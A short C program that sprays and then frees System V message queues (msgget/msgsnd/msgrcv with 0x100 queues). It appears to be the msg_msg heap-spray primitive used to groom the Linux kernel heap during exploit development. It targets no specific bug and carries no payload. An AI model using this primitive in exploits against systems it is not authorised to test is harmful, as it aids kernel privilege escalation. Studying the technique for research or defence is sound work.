#include <sys/msg.h>

#define msg_size 256
#define msg_spray 0x100
#define msg_mtype 0xdead
struct msg {
  long mtype;
  char mtext[msg_size - 0x30];
} msg;
size_t msg_queues[msg_spray];
void spray_msg() {
  msg.mtype = msg_mtype;

  for (int i = 0; i < msg_spray; i++) {
    msg_queues[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  }

  for (int i = 0; i < msg_spray; i++) {
    msgsnd(msg_queues[i], &msg, sizeof(msg) - sizeof(long), 0);
  }
}

void free_msg() {
  for (int i = 0; i < msg_spray; i++) {
    msgrcv(msg_queues[i], &msg, sizeof(msg) - sizeof(long), msg_mtype, 0);
  }
}

int main() {
  spray_msg();
  free_msg();
}
